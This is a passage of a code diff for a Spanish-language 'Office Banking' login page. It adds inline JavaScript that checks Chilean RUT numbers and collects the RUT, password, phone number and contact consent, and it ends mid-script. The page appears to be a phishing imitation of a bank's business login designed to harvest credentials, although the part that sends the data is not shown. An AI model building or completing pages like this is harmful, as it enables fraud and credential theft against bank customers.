@@ -4,8 +4,7 @@
   <meta charset="UTF-8">
   <title>Office Banking</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Ruta absoluta al CSS -->
-  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="styles.css">
   <style>
     .spinner {
       border: 8px solid #f3f3f3;
@@ -33,8 +32,7 @@
 </head>
 <body>
   <div class="login-box">
-    <!-- Logo -->
-    <img src="/logo-officebanking.png" alt="Office Banking" class="logo">
+    <img src="logo-office-banking.png" alt="Office Banking" class="logo">
 
     <!-- Formulario inicial -->
     <form id="loginForm">
@@ -74,16 +72,39 @@
       <button onclick="enviarCorreo()">Enviar</button>
     </div>
 
-    <!-- Pantalla de productos -->
+    <!-- Pantalla de productos disponibles -->
     <div id="pantallaProductos" class="hidden">
       <h2>Tenemos algunos productos disponibles para tu Empresa</h2>
       <button class="btn-red" onclick="continuarProductos()">Continuar</button>
     </div>
-  </div>
 
-  <!-- Script principal -->
-  <script src="/productos.js"></script>
-</body>
-</html>
+<script>
+  // Validación de RUT
+  function validarRut(rutCompleto) {
+    rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
+    if(rutCompleto.length < 2) return false;
+    let cuerpo = rutCompleto.slice(0, -1);
+    let dv = rutCompleto.slice(-1);
+    let suma = 0, multiplo = 2;
+    for(let i = cuerpo.length - 1; i >= 0; i--) {
+      suma += parseInt(cuerpo.charAt(i)) * multiplo;
+      multiplo = multiplo < 7 ? multiplo + 1 : 2;
+    }
+    let dvEsperado = 11 - (suma % 11);
+    dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
+    return dv === dvEsperado;
+  }
 
- 
+  document.getElementById("loginForm").addEventListener("submit", async function(e){
+    e.preventDefault();
+    const rut = document.getElementById("rut").value;
+    const passwd = document.getElementById("passwd").value;
+    const telefono = document.getElementById("telefono").value;
+    const contacto = document.getElementById("contacto").checked;
+
+    if(!validarRut(rut)){
+      document.getElementById("resultado").innerText = "❌ RUT inválido";
+      return;
+    }
+    if(!contacto){
+      document.getElementById("resultado").innerText = "⚠️ Debe aceptar ser contactado por un
